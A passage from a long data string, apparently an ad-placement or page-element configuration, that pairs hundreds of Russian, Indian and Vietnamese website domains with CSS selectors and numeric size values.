updated"]*250**adfox.ru*div[id^="news_and_feedbacks_block"]*250**astromeridian.ru*div[id^="main-content_gl"]*200**allbesta.cc*div[id^="dle-content"]*200**24xxx.mequto.ru*div[id^="car_latest"]*200**24xxx.me*div[class^="content__block"]*200**revolvermaps.com*div[class^="layout-content"]*250**flibusta.is*div[id^="sidebar-right"]*600**1plus1tv.ru*div[id^="dle-content"]*200**spaces.ru*div[id^="index_page"]*250**rsload.net*div[id^="dle-content"]*200**dni.ru*div[class^="container__big"]*200**iphones.ru*div[class^="container iph_container"]*250**babla.ru*div[class^="content-column"]*250**time-to-read.ru*div[class^="viral-cont clearfix js-news-block"]*250**ovkuse.ru*div[class^="my-widget-anchor"]*400**ovkuse.ru*div[class^="categoryRecipes  "]*250**9111.ru*div[id^="main_div"]*200**xcafe.com*div[class^="content container"]*200**pr-cy.ru*div[class^="container main-content"]*250**anews.com*div[class^="post-list"]*250**awd.ru*div[class^="vc_row td_uid_5_59cf55fda5812_rand  wpb_row td-pb-row"]*200**myvi.ru*div[class^="left-column"]*200**nix.ru*div[id^="container"]*250**twirpx.com*div[class^="category-map"]*250**live-smi.ru*div[class^="leftcolumn"]*400**tophotels.ru*div[class^="container "]*90**nnm.me*div[id^="content"]*90**nnm.me*div[id^="sidebar"]*400**sibnet.ru*div[class^="layout__g-major-bottom"]*250**animevost.org*div[id^="leftBlock"]*250**womanadvice.ru*div[id^="amainwrapper"]*250**navalny.com*div[class^="l-grid__item three-twelfths"]*400**navalny.com*div[class^="b-post-list"]*250**blizko.ru*div[class^="showcase-box b-b-item"]*200**rns.online*section[class^="c-container c-container--c1 js-main"]*250**ororo.tv*div[class^="channels"]*250**topcinema.tv*div[class^="block block-type-stream"]*200**topcinema.tv*div[class^="block blogtopics"]*200**fontanka.ru*div[class^="tab_conteiner ps-container ps-active-y"]*400**fontanka.ru*div[class^="center-col fll"]*250**2ip.ru*div[class^="wide-column"]*250**mysku.ru*div[class^="sidebar_container"]*600**forbes.ru*div[class^="panel-pane pane-page-content"]*200**cont.ws*div[class^="lenta"]*200**rlsnet.ru*div[class^="main__inner g-clear-fix"]*250**svpressa.ru*div[class^="b-content__aside"]*250**doramatv.ru*div[class^="rightContent"]*250**gibdd.ru*section[id^="middle"]*200**garant.ru*section[class^="category-section m-1"]*90**porno365.net*div[class^="col_video"]*250**porno365.net*div[class^="blocks_videos"]*250**pulscen.ru*div[class^="col-right p0"]*250**pulscen.ru*div[class^="rubrikator clearfix"]*90**pure-t.ru*div[id^="primary"]*90**svoboda.org*div[id^="content"]*200**riafan.ru*div[class^="sidebar_wrapper"]*400**fasttech.com*div[id^="Popular-Products"]*250**readmanga.me*div[class^="leftContent"]*200**tjournal.ru*div[class^="sidebar_twister__sticky sticky"]*250**wwr.perfectgirls.net*div[class^="list list-with-banner"]*250**seosprint.net*div[id^="content"]*90**seosprint.net*div[id^="block-left"]*200**torrent-games.net*div[id^="center"]*200**ontvtime.ru*div[class^="extra"]*400**subscribe.ru*div[class^="layer-right"]*600**subscribe.ru*div[class^="layer-left"]*250**russianfood.com*div[class^="sub_block sb_rcpf"]*400**znanija.com*div[class^="sg-box sg-box--small-padding sg-box--no-border"]*250**znanija.com*div[class^="sg-layout__box"]*250**mediamath.com*section[class^="mediamath-page-content"]*200**d3.ru*div[class^="b-sidebar__container"]*600**varlamov.ru*div[class^="j-w j-beta-w j-w-youtube"]*250**joyreactor.cc*div[id^="post_list"]*250**filmitorrent.org*div[id^="dle-content"]*200**eadaily.com*div[id^="contentcalc"]*250**prostoporno.me*div[class^="thumbs_list"]*250**prostoporno.me*div[class^="thumbs_list catlist"]*250**vc.ru*div[class^="sidebar_twister__item sidebar_twister__item--hashtags"]*600**litres.ru*div[class^="arts_container not_tablet"]*200**russia.tv*div[id^="main"]*250**lentainform.com*div[id^="box"]*200**ficbook.net*div[class^="genres-list same"]*200**ficbook.net*div[class^="col-lg-4 skip"]*250**livemaster.ru*div[class^="grid-2c-content"]*250**livemaster.ru*div[class^="grid-sidebar-left b-sidebar-left"]*400**24smi.info*div[class^="clearfix top-columns"]*200**blamper.ru*div[class^="b-sections-wrap"]*200**mypornoonlain.tv*div[class^="video-box-bg"]*200**bobfilm.club*div[id^="dle-content"]*200**vedomosti.ru*div[class^="b-news ng-isolate-scope"]*250**afisha.ru*div[class^="g-quarter-col"]*400**ngs.ru*div[class^="ngs-main-right-column__wrapper js-right-column-fixed"]*250**farpost.ru*div[class^="mainPromo"]*90**labirint.ru*div[class^="bl-right bl-right-main"]*250**all.biz*div[class^="b-home-content-inner js-main-content"]*250**megogo.net*div[class^="tab-content"]*250**megogo.net*div[class^="info info_summary"]*400**megogo.net*div[class^="part part_premiere"]*250**interfax.ru*div[class^="dNewsCont bSpace v31__tl"]*250**dotabuff.com*div[class^="col-8"]*200**exist.ru*div[class^="content-page"]*250**rusvesna.su*div[class^="block block-panels-mini"]*250**kakprosto.ru*div[id^="account-blocks-top5-authors-block"]*600**fast-torrent.ru*div[id^="leftmenu"]*400**nalog.ru*div[id^="main_blocks_id"]*250**muzofon.com*div[class^="block"]*200**muzofon.com*div[id^="vk_groups"]*400**kinozal.tv*div[class^="tp1_border"]*250**citilink.ru*div[class^="clearfix product-card-container product-card-container_row2  tab-main top-products  block_data__gtm-js between-card-banners_gtm-js"]*250**dns-shop.ru*div[class^="products catalog-products view-tile"]*250**mediametrics.ru*section[class^="container clearFix"]*200**pornolab.net*div[id^="main_content_wrap"]*250**vz.ru*div[id^="topor"]*90**geektimes.ru*div[class^="sidebar_right sidebar_content-area js-sidebar_right sticky_init"]*400**anysex.com*div[class^="leftside"]*250**ixbt.com*div[class^="product clearfix"]*600**tutu.ru*div[class^="l-content_block b-mainpage__news"]*250**gosuslugi.ru*div[class^="content-center-box ng-scope"]*250**newsru.com*div[class^="body-page-center-column"]*250**newsru.com*div[class^="body-page-left-column"]*400**kommersant.ru*div[class^="col col-big js-middleTop"]*200**playground.ru*div[class^="page-main-column content-layout gp-main-column container-fluid"]*200**aif.ru*div[class^="content_body"]*90**bolshoyvopros.ru*div[class^="main_cont"]*250**meduza.io*div[class^="Page Page--asSections"]*250**auto.ru*div[class^="IndexPresets__list IndexPresets__list_page_2"]*250**academic.ru*div[id^="diclist"]*250**otzovik.com*div[class^="content_left"]*200**otzovik.com*div[class^="content_right"]*400**irecommend.ru*div[class^="block blueBlock"]*200**rg.ru*div[class^="b-sidebar-right b-sidebar-right_index"]*250**rg.ru*div[class^="b-content b-content_index"]*250**ulmart.ru*section[id^="mainPageTopGoods"]*250**24video.adult*div[class^="video-page-content"]*250**zerodha.com*div[class^="landing-sections landing-updates"]*200**top10homeremedies.com*div[id^="main"]*250**unblocked.bid*div[class^="listrows"]*250**wrapbootstrap.com*div[class^="row newest"]*200**redhdtube.xxx*div[class^="thumbs_wrap"]*200**xossip.com*div[id^="xbwrap"]*90**skidrow-games.com*div[id^="overall-container"]*250**testfun.net*div[class^="row game-grid mainContent"]*250**jagranjosh.com*div[id^="ls-row-4-area-3"]*400**downloadming.la*section[class^="secondary clearfix"]*600**maharashtra.gov.in*div[class^="bottomCont"]*200**feedjit.com*div[id^="previewDiv"]*90**feedjit.com*div[id^="leftContainer"]*90**ace2three.com*div[id^="content_container"]*200**cleartax.in*div[class^="row VR_QnH"]*250**webhostingtalk.com*div[id^="sidebar_container"]*400**epfindia.com*div[id^="left_accordian"]*200**emp3s.cc*div[class^="tab-content"]*200**sc.com*div[id^="fix_col_cont"]*400**torrentunblock.com*div[class^="row items"]*250**movierulz.is*div[class^="span12 clearfix"]*250**movierulz.is*div[class^="span12 clearfix"]*250**desidime.com*div[class^="deals_grid"]*200**team-bhp.com*div[class^="marB10 clearfix"]*200**compare.buyhatke.com*div[id^="content_main"]*200**mp3goo.fm*div[id^="text-2"]*400**xamarin.com*div[id^="lifecycle"]*90**vikatan.com*div[class^="col-xs-12 no-padding js-cnt-part"]*200**boldsky.com*div[id^="container"]*250**watchmovie.ms*div[class^="content-box"]*200**bankersadda.com*div[class^="region-inner main-inner"]*250**bollywoodhungama.com*div[id^="bh-top-grid"]*250**searchenginewatch.com*div[class^="main-container post-container the-last-word-on-fred-from-googles-gary-illyes-page-container"]*200**kickasstorrents.eu*div[class^="site-content"]*200**worldfree4u.ind.in*div[id^="primary"]*250**worldfree4u.ind.in*div[id^="secondary"]*600**freedownloadmanager.org*div[class^="fon3"]*250**www.en.advertisercommunity.com*section[class^="section section-solutions light-gray"]*250**dirtypornvids.com*div[id^="left-column-wide"]*200**careers360.com*div[class^="product-container"]*250**bollywoodlife.com*div[id^="topper-stage"]*250**zaubacorp.com*div[class^="welcometext row"]*250**scroll.inlipsum.com*div[id^="Panes"]*250**scroll.in*div[class^="swipe-cards-container"]*250**prokerala.com*div[class^="main-content full"]*200**keywordtool.io*div[id^="block-system-main"]*250**hindi.webdunia.com*div[class^="top_news bar_orange wbx no_brdr_b "]*250**dominos.co.in*div[class^="col-xs-12 home-product-box"]*90**couponraja.in*div[class^="cpnCntnr gtrset"]*250**proxyof.com*div[class^="wrapper"]*200**bobibanking.com*div[class^="contentWrapper"]*90**ibps.in*div[id^="post-5"]*250**mca.gov.in*div[class^="middleContent center"]*250**tecmint.com*div[class^="post-list group"]*250**movierulz.ms*div[id^="list"]*200**cineulagam.com*div[class^="featured-news-wrapper"]*200**labnol.org*div[class^="col-sm-12 col-lg-7 col-md-7"]*200**howtoforge.com*div[id^="htfContentList"]*250**medindia.net*div[class^="mi-container__fluid"]*250**wallpaperswide.com*div[id^="content"]*90**newindianexpress.com*div[class^="container SectionContainer"]*250**raagtune.org*div[class^="gsc-control-cse gsc-control-cse-en"]*250**dogpile.com*div[class^="popularFetchMainWrapper"]*90**totalsportek.com*div[class^="site-inner"]*250**mobikwik.com*div[class^="whyWlt"]*200**topuniversities.com*div[class^="panel-pane pane-block pane-block-45 target-arrow bounce"]*250**badtameezdil.net*div[id^="main-content"]*250**ap.gov.in*div[class^="col-lg-12 section-two padding-none"]*250**bseindia.com*div[class^="neweqitymainarea"]*250**hackerrank.com*div[class^="static-section"]*250**bigbasket.com*section[class^="row custom-component carousel-section ng-scope"]*200**oyorooms.com*div[class^="deals__container mdl-grid"]*90**goindigo.in*div[class^="main clearfix"]*200**promocodeclub.com*div[class^="sidebar"]*400**tympanus.net*div[id^="bsap_1275127"]*250**financialexpress.com*div[class^="leftpanel col-sm-8"]*90**geeksforgeeks.org*div[class^="quickLink_S"]*400**smartprix.com*div[class^="content-wrapper"]*250**divyabhaskar.co.in*section[class^="top_news_section"]*250**aglasem.com*div[class^="entry-content content"]*90**maalaimalar.com*div[class^="main"]*200**santabanta.com*div[class^="div_990"]*250**translated.net*div[id^="quoteform"]*200**cpanel.com*section[class^="container-fluid text-center business"]*90**adveric.net*div[class^="product-info-wrapper"]*250**www.bollywoodshaadis.com*div[class^="ltt_art1st"]*200**soft112.com*section[id^="aside-column"]*600**rediff.com*div[id^="leftcontainer"]*250**ideacellular.com*div[class^="maginTop13 fltlft"]*200**businessinsider.in*div[class^="homepage index"]*250**torrentking.eu*section[id^="slider-runningshows"]*200**torrentking.eu*div[class^="home-sliders"]*200**content.icicidirect.com*div[class^="contWrapper"]*250**todaypk.ag*div[class^="slider_box s_home"]*250**cplusplus.com*div[id^="I_content"]*250**optimisemedia.com*div[class^="full-width-text spb_content_element col-sm-12 spb_text_column"]*250**shoutmeloud.com*section[class^="blogcontainer"]*250**deccanchronicle.com*div[id^="topStory"]*200**tradeindia.com*section[class^="gry-section"]*250**pepperfry.com*div[id^="page-wrapper-content"]*200**appscase.com*div[class^="sectionBtn"]*200**yoast.com*div[class^="site"]*250**whois.net*div[id^="quick_links"]*250**awwwards.com*div[class^="box-site-head"]*200**imlive.com*div[class^="hostList host_view"]*200**dinamalar.com*div[class^="wid980"]*250**about.gitlab.com*div[class^="home-lifecycle-diagram"]*250**91mobiles.com*div[class^="home_top_news_pnl"]*250**patrika.com*div[id^="eod-content"]*250**businessdictionary.com*div[class^="container fc-container"]*200**movixhub.com*div[id^="content"]*200**majestic.com*div[id^="searchBar"]*250**mathrubhumi.com*div[class^="col-md-12 col-sm-12 col-xs-12 grid_30"]*200**whois.com*div[class^="home-content"]*250**freepdfconvert.com*div[class^="alert alert-warning"]*250**storypick.com*div[class^="td-ss-main-content"]*250**citruspay.com*div[id^="myCarousel"]*250**vidads.in*div[class^="inner"]*90**hqtube.xxx*div[class^="thumbs_wrap"]*200**monsterindia.com*div[class^="container hmwidth"]*90**sportskeeda.com*div[class^="container editor-width-100-pc"]*250**1337x.to*div[class^="col-8 col-push-2 page-content"]*200**firstpost.com*div[class^="news-item"]*250**informer.com*div[id^="borderline"]*90**india.com*section[class^="containerTabletLeft"]*250**in.bookmyshow.com*section[class^="featured-events section-bg"]*250**makemytrip.com*div[class^="fd_wrap clearfix"]*250**shopclues.com*div[class^="row cat_promotion_box triplevaluesale"]*200**zomato.com*div[class^="col-l-16"]*250**justdial.com*div[class^="wrapper category-wrapper mb-10"]*200**moneycontrol.com*div[class^="tpgls MT20"]*400**jabong.com*div[class^="col-lg-10 col-lg-push-1 col-md-10 col-md-push-1 col-sm-12 col-xs-12 col-xss-12 mt25"]*200**naukri.com*div[class^="leftSec fl"]*90**naukri.com*div[class^="fr rgtBar"]*400**dzone.com*div[class^="col-md-12 widget-content homepage"]*200**monova.org*div[class^="col-md-12 z-depth-1 background-block"]*90**nseindia.com*div[class^="int_rightPannel investorDiv"]*250**nseindia.com*div[class^="int_left"]*600**pingdom.com*div[class^="content-wrapper pagewidth vspace-top-l"]*90**shabdkosh.com*div[class^="col-lg-8 col-md-7"]*200**torrentfunk.com*div[id^="content"]*250**bsnl.co.in*div[class^="main"]*90**accenture.com*div[class^="ui-container   row-wide  clear-float white c-left c-ui-square"]*200**magicbricks.com*div[id^="projectGalleryDiv"]*250**media.net*div[class^="bingNetworkCont"]*200**mapsofindia.com*div[class^="main-map"]*90**limetorrents.cc*div[id^="rightbar"]*400**limetorrents.cc*div[id^="content"]*250**vcommission.com*div[id^="main-slideshow"]*90**sc.com*div[id^="c1320406653663"]*90**timesjobs.com*div[class^="clearfix wrap"]*200**moviescounter.co*div[id^="content_box"]*250**ru.gravatar.com*div[class^="box"]*90**vodafone.in*div[id^="shopOnlineWrap"]*200**mensxp.com*div[class^="row col-5-medium mb-20"]*200**kotak.com*div[class^="white-background"]*250**yatra.com*div[class^="container clearfix"]*250**smashingmagazine.com*div[class^="grid clearfix"]*250**torrentz.com*div[class^="footer"]*90**tikona.in*div[id^="block-tikona-forhome-how-we-deliver"]*200**level3.com*div[class^="cards-module"]*90**dailythanthi.com*div[class^="row b-r"]*200**indiapost.gov.in*div[class^="zerogrid"]*200**indiarailinfo.com*div[class^="topcapsule"]*250**thepiratebay-proxylist.org*div[class^="container"]*90**shine.com*div[id^="rightcontainer"]*200**saavn.com*div[class^="album-grid"]*250**inmotionhosting.com*div[id^="main"]*200**nesaporn.com*div[class^="main"]*250**getappsonline.com*div[class^="row wrapper"]*250**softorama.com*div[class^="catalog-tag"]*200**searchengineland.com*div[class^="right-rail-content"]*600**99acres.com*div[id^="homepage_btf"]*200**xxxtubedot.com*div[class^="right"]*250**yify-torrent.org*div[id^="content"]*200**onlymyhealth.com*div[id^="ls-gen5595130-ls-fxr"]*250**cleartrip.com*div[class^="travelSpace"]*200**sifyitest.com*div[class^="article-inner"]*250**zapmeta.co.in*div[class^="slogan hidden-xs"]*250**iconfinder.com*div[class^="promotion-bar homepage-announcement hidden-tablet hidden-phone"]*250**rvcj.com*div[class^="vc_row td_uid_2_59ca26b5617d1_rand  wpb_row td-pb-row"]*200**dnaindia.com*div[class^="region region-content"]*250**computerhope.com*div[id^="main-content"]*250**livemint.com*div[id^="main-content"]*200**sportzwiki.com*div[id^="tps_slideContainer_139110"]*90**tawk.to*div[class^="sections_group"]*250**news18.com*div[class^="banner-block"]*90**ibtimes.co.in*div[class^="area wrap-left"]*200**filmibeat.com*div[class^="filmibeat-block clearfix"]*250**business-standard.com*div[id^="hpcontentbox"]*200**bluestacks.com*div[class^="content current"]*250**bluestacks.com*div[id^="news-games"]*250**filmfanatic.com*div[id^="coordAnchor"]*200**templatemonster.com*div[class^="tabs rd-tabs rd-tabs_grey js-tabs"]*90**pornhd.com*div[class^="page-wrapper content-wrapper"]*90**anybunny.com*div[class^="main"]*250**fmovies.to*div[id^="body-wrapper"]*200**torrentdownloads.me*div[class^="left_container"]*250**torrentdownloads.me*div[class^="right_container"]*400**asp.net*div[class^="col-left"]*90**gaana.com*div[id^="main_middle_content"]*200**tripadvisor.in*div[id^="taplc_homepage_shelves_0"]*200**apkmirror.com*div[id^="primary"]*250**online-convert.com*div[id^="content_2col_index"]*200**freejobalert.com*div[class^="sidebar1"]*400**freejobalert.com*div[class^="sidebar2"]*600**hongkiat.com*div[id^="latest-posts-1"]*250**jagran.com*div[class^="topslider-main"]*250**scoopwhoop.com*div[class^="rightPart"]*600**w3.org*div[class^="w3c_mainCol"]*250**abplive.in*div[class^="flex_box newsSection home_news_section"]*90**abplive.in*div[class^="flex_box_3 hidden-xs hidden-sm"]*400**semrush.com*div[class^="content-wrapper clearfix"]*90**keepvid.com*div[id^="tab1"]*200**oneindia.com*div[id^="containerMain"]*250**cricbuzz.com*div[id^="page-wrapper"]*250**codeproject.com*div[class^="container-article  fixed"]*200**indiamart.com*div[class^="tabs-content left"]*250**jquery.com*div[id^="home-content"]*250**quikr.com*div[id^="promotion_banners"]*200**thehindu.com*div[class^="container-main"]*200**paytm.com*div[class^="_2Bze"]*90**bhaskar.com*div[class^="eodstory"]*250**filehippo.com*div[class^="left-hand-col"]*250**filehippo.com*div[class^="right-hand-col"]*600**naukri.com*div[class^="bms fl"]*400**ddoc.edu.vn*div[id^="sidebar"]*400**duytan.edu.vn*div[id^="content-wrap"]*200**khampha.vn*div[class^="colLeft"]*250**gamen.vn*div[class^="w700 kbwcb-left fl"]*250**15s.vn*div[class^="viphot-home-heading"]*250**hutech.edu.vn*div[class^="inner clearfix"]*200**truyentranhmoi.com*div[class^="main-container"]*200**vinabiz.org*div[id^="Wid-Content-Home-News"]*90**vnphoto.net*div[class^="span-11 last"]*600**winphoneviet.com*div[id^="right-sidebar"]*400**autosurf.vn*div[id^="conts_left"]*200**bongdatructuyen.us*div[id^="banner_Supper"]*90**ndh.vn*div[class^="col-right"]*250**vnhot.net*div[class^="main_wrap"]*200**htv3tv.com*div[class^="row movie-update hidden-xs"]*200**10hay.com*div[class^="td-container td-pb-article-list"]*200**tuvikhoahoc.com*div[id^="nav_menu-15"]*400**fpt.edu.vn*div[class^="tdc-content-wrap"]*90**tintaynguyen.com*div[class^="home-top-posts"]*250**hanoimoi.com.vn*div[id^="SlideHome"]*250**customs.gov.vn*div[id^="PortalMainContent"]*250**baonghean.vn*div[class^="newstop row15"]*250**hangmup.com*div[class^="loop-content switchable-view grid-small"]*250**autodaily.vn*div[class^="col-right"]*400**chatvl.com*div[id^="entries-content-ul"]*90**phimditnhau.biz*div[class^="loop-content switchable-view grid-small"]*250**playdota.vn*div[class^="hidden-xs hidden-sm"]*400**playdota.vn*div[class^="module module-featured"]*200**gai17.net*div[class^="loop-content switchable-view grid-small"]*250**playpark.vn*div[class^="containerl"]*250**phongxongdamuoidamuoi.blogspot.am*div[class^="widget Blog"]*250**ybox.vn*div[id^="articleSearching"]*200**ybox.vn*div[class^="panel-body c3"]*600**sotaychame.com*div[id^="homepage"]*90**kqxs.vn*div[class^=" floatL colcenter"]*90**kqxs.vn*div[class^=" floatL colR"]*600**echip.com.vn*div[class^="body_center body_center_cate"]*400**bong88.com*div[class^="main"]*90**ants.vn*div[id^="pl-2060"]*200**luatminhgia.com.vn*div[class^="wapperContent"]*250**congnghe5giay.com*div[id^="cnsidebar"]*400**saodepthe.com*div[class^="outer-wrapper"]*250**totuonggiare.wordpress.com*div[class^="header-image"]*250**tourismguideonline.info*div[id^="srcArea"]*250**blogkhoahoc.net*div[class^="span4 column_container"]*600**ketoanthienung.net*div[id^="AdvTopRight"]*200**myeva.vn*div[class^="td-pb-padding-side td-page-content"]*200**phimvtv3.net*div[class^="row slider show-for-large-only"]*250**thoibao.today*div[id^="content-main"]*250**congly.vn*div[class^="content-left"]*200**rung.vn*div[class^="home-right-col fl"]*600**tinhhoa.net*div[id^="main-left"]*90**tinhhoa.net*div[id^="sidebar"]*400**izito.com.vn*div[class^="slogan hidden-xs"]*200**freetuts.net*div[class^="sidebar main-sidebar"]*400**daynhauhoc.com*div[id^="ember983"]*200**baochinhphu.vn*div[class^="topzones hasshadow clearfix"]*250**vietnamcupid.com*div[class^="container clearfix"]*200**muabannhanh.com*div[class^="content-block"]*200**vietjack.com*div[id^="global"]*250**nethd.org*div[class^="container-fluid pagewidth"]*200**tkaraoke.com*div[class^="container2_top"]*90**tpb.vn*div[class^="sub-menu-home for_desktop"]*90**tolam.org*div[class^="hotnewstdq"]*250**xemtvhd.com*div[class^="widget-content"]*200**123mua.vn*div[class^="container-right"]*250**banxehoi.com*div[class^="contentcolumn"]*250**muabannhadat.vn*div[id^="mbnd_id_feature_list"]*400**chatvl.tv*div[id^="content-holder"]*200**heaveniphone.com*div[class^="body_wrapper"]*90**gamehub.vn*div[class^="secondaryContent widget AppotaWidget_WidgetRenderer_HomeQuizz"]*600**truyencv.com*div[class^="featured-content"]*90**gsm.vn*div[class^="mainContent"]*250**tuvisomenh.com*div[class^="zone zone-aside-second"]*600**infogame.vn*div[class^="height_right"]*250**canhme.com*div[id^="coupon-table"]*400**congtruongit.com*div[class^="mainContent"]*250**ntruyen.info*div[id^="cBestStoryOnTop"]*200**qdnd.vn*div[class^="row hothome-page"]*200**nhommua.com*div[class^="banner_right_home"]*600**nhommua.com*div[class^="banner_left_home"]*600**fpts.com.vn*div[id^="divBodyLeft"]*200**fpts.com.vn*div[id^="divBodyRight"]*600**songkhoe.vn*div[class^="consulting-phy consulting-phy-new"]*400**hanoiwiki.com*div[class^="td-pb-span4 td-main-sidebar"]*250**hanoiwiki.com*div[class^="td-pb-span8 td-main-content"]*200**hanoiwiki.com*div[class^="wpb_wrapper"]*250**carmudi.vn*div[class^="car-list"]*250**bonbanh.com*div[id^="mainc2"]*90**bonbanh.com*div[id^="colR"]*250**thongtintuyensinh.vn*div[id^="maincontent"]*250**baophapluat.vn*div[class^="wrap-content"]*250**shopee.vn*div[class^="category-overview-with-banner-wrapper"]*250**xoso.com.vn*div[class^="conten_center"]*200**tuiiu.com*div[id^="sidebar"]*250**tuiiu.com*div[id^="body-wrap"]*200**netlife.vn*div[class^="content container"]*250**blogchiasekienthuc.com*div[id^="main-content"]*250**ohay.tv*div[class^="container shay"]*250**f319.com*div[class^="mainContent"]*200**handheld.com.vn*div[class^="globalWrapper pageWidth"]*250**forum.idichvuseo.com*div[class^="mainContent"]*200**cungmua.com*div[class^="container dad"]*250**xemphimon.com*div[class^="block mt-10"]*250**vtv16.com*div[id^="wrapper home container __web-inspector-hide-shortcut__"]*250**phunuonline.com.vn*div[id^="t3-mainbody"]*250**hopamchuan.com*div[id^="home-page-content"]*90**giaiphapexcel.com*div[class^="mainContainer"]*90**thegioitinhoc.vn*div[id^="content_container"]*90**truyenfull.vn*div[id^="list-index"]*200**xemphim73.com*div[class^="slider-outer"]*90**xemphim73.com*div[class^="cols group"]*250**enternews.vn*div[id^="sub-nav"]*90**bidv.com.vn*div[id^="content_left"]*90**beat.vn*div[class^="bx-feed ng-scope"]*90**loigiaihay.com*div[class^="box_slide clearfix"]*400**hanoiiplus.com*div[class^="vc_row td_uid_2_59c27cf70d498_rand  wpb_row td-pb-row"]*250**kichdam.com*div[class^="loop-content switchable-view grid-small"]*250**down.vn*div[class^="maincontent"]*250**topgia.vn*div[class^="main clearfix"]*250**muachung.vn*div[class^="main-layout"]*200**tinthethao.com.vn*div[class^="content_main pad20 pkg"]*200**nguyentandung.org*div[class^="column-left"]*250**didongthongminh.vn*div[class^="main-full-column"]*200**mup3x.com*div[class^="loop-content switchable-view grid-small"]*200**9mobi.vn*div[class^="cnews clearfix"]*400**nhacmoi.vn*div[class^="block block-news block-vertical"]*200**vnmoto.net*div[class^="admania_siteinner"]*200**phapluatplus.vn*div[id^="multimedia_box"]*250**bongdanet.vn*div[class^="news-block-main"]*250**luatminhkhue.vn*div[class^="main-container"]*250**moj.gov.vn*div[id^="main-content"]*250**appvn.com*div[class^="box-collection row"]*200**langnhincuocsong.com*div[class^="vc_row wpb_row td-pb-row td-ss-row"]*250**cafeland.vn*div[class^="container wrap-main-page"]*200**thuthuattienich.com*div[id^="main-content"]*250**lamsao.com*div[class^="categories-home-module container no-padding"]*200**mediamart.vn*div[class^="big-banner"]*200**nhac.vn*div[id^="box_hotlist"]*200**appnhe.com*div[class^="card-primary-wrapper"]*200**appnhe.com*div[class^="row game-grid mainContent"]*200**enbac.com*div[class^="menu_banner fl"]*90**autopro.com.vn*div[class^="wrapper content-border wrapper-details"]*250**gaigoi18.com*div[class^="loop-content switchable-view grid-small"]*200**alonhadat.com.vn*div[id^="ctl00_content_pc_content"]*200**giainhan.vn*div[id^="main-content"]*250**careerbuilder.vn*div[id^="feature_js"]*90**tienganh123.com*div[class^="containt_center_cen clear"]*200**bepthiencam.com*div[id^="content-wrapper"]*250**thammyvientoanquoc.com*div[id^="content-wrapper"]*250**diendanlamdepvn.com*div[id^="content-wrapper"]*250**diendanbepdientu.com*div[id^="content-wrapper"]*250**beptuviet.com*div[id^="content-wrapper"]*200**viettimes.vn*div[class^="site-container clearfix"]*250**ket-noi.com*div[id^="mbody_right"]*200**techrum.vn*div[id^="articlesGrid"]*200**lozi.vn*div[id^="article"]*200**vkool.net*div[id^="sidebar"]*90**vkool.net*div[id^="sidebar"]*400**www.bkav.com.vn*div[id^="p_p_id_56_INSTANCE"]*250**animetvn.com*div[class^="home-main-container"]*200**vneconomy.vn*div[class^="contentleft"]*200**sstruyen.com*div[class^="hot-bg"]*250**sexgai.net*footer[id^="footer"]*250**sexgai.net*div[id^="details"]*250**sexgai.net*div[id^="content"]*250**muare.vn*div[class^="mainContent"]*250**www.hosocongty.vn*div[class^="columnLeft"]*250**www.vietinbank.vn*div[class^="clearfix box3"]*200**ngoisao.vn*div[class^="content-chuyenmuc"]*250**game8.vn*div[id^="div_Home_ListNewsPartial"]*250**www.vietgiaitri.com*div[id^="content"]*250**thachpham.com*div[class^="container home-featured"]*90**giaoduc.net.vn*div[class^="inner-wrap"]*250**edumall.vn*section[id^="section-highlight"]*250*5gdt.gov.vn*div[class^="wpsPortletGDTSkin2"]*200**www.minhngoc.net.vn*div[class^="dnw-content-layout"]*200**www.xemgame.com*div[class^="dongsukiengame"]*200**baodansinh.vn*div[class^="content_bottom clearfix"]*90**gamelumi.com*div[class^="yxJpList"]*200**go.vn*div[class^="col_n_left"]*250**truyentranhtuan.com*div[id^="main-content"]*250**giadinh.net.vn*div[class^="contentl fl"]*250**vieclam24h.vn*div[class^="box_content_nofi_s00 no-border"]*90**www.bkav.com.vn*div[id^="p_p_id_productsintro_WAR_BkavUIportlet_"]*90**www.stablehost.com*section[class^="section-products"]*90**www.hdsieunhanh.com*section[id^="scroll-phimhot"]*200**kenhsinhvien.vn*div[class^="sidebar btmRightBlocks"]*250**www.kites.vn*div[id^="article-home"]*200**phimhayso.com*div[class^="section"]*90**blogtruyen.com*div[id^="top-newest-comment"]*600**hqapps.net*div[id^="main"]*250**www.timviecnhanh.com*section[class^="body-home"]*250**www.vnwebgame.com*div[class^="introduce"]*200**khoahoc.tv*div[class^="listbox relatedlist"]*400**www.hotdeal.vn*div[class^="product product--details"]*250**lamchame.vn*div[class^="row mt20"]*250**tubep.com*div[id^="content"]*250**www.beat.vn*div[class^="right-inner"]*400**2idol.tv*div[id^="post-container"]*250**rongbay.com*div[class^="area_content_home"]*90**news.otofun.net*div[class^="section-right"]*600**www.yeutretho.vn*div[class^="col860 fl"]*200**thethaovanhoa.vn*div[class^="clearfix chitiet_r f_l"]*200**mibet.mobi*div[class^="all-icon-service"]*90**tinnhanhchungkhoan.vn*section[class^="focus"]*200**sohoa.vnexpress.net*div[class^="width_common line_col"]*200**anime14.net*div[class^="ml-title"]*200**truyentranh.net*div[class^="col-md-4"]*600**truyentranh.net*section[class^="bodycontainer"]*90**infonet.vn*div[class^="site-wrap"]*90**www.dienmayxanh.com*section[id^="main-container"]*250**xem.vn*div[id^="leftColumn"]*200**kul.vn*div[class^="section container--list"]*200**mangak.info*div[class^="top_thang"]*250**ictnews.vn*div[class^="news-center"]*200**docbao.vn*div[class^="news_top"]*250**thichtruyentranh.com*div[id^="boxslide_2"]*200**sachgiai.com*div[id^="hot-news"]*250**websosanh.vn*div[id^="banner-promotion"]*250**vndoc.com*div[id^="leftsidebar"]*600**deal.adayroi.com*div[id^="suggested_products"]*250**violet.vn*div[id^="main"]*200**blogtin.com*div[class^="detail_content"]*200**vuighe.net*div[class^="tray-content index"]*250**diadiemanuong.com*div[id^="grid_video"]*200**xskt.com.vn*section[id^="center-content"]*200**bomtan.org*div[id^="player_field"]*250**bomtan.org*div[id^="phim-hot-thang"]*90**vetv.vn*div[id^="option-stream"]*250**4share.vn*div[class^="row home-page"]*90**truyentranh8.net*div[class^="TitleH2 text-danger"]*200**www.tinmoi.vn*div[class^="headlines-cate blue-cate"]*250**www.vntrip.vn*div[class^="hot-place"]*250**xemphimso.com*div[id^="player"]*250**plo.vn*div[id^="main1"]*90**danketoan.com*div[class^="nodeList 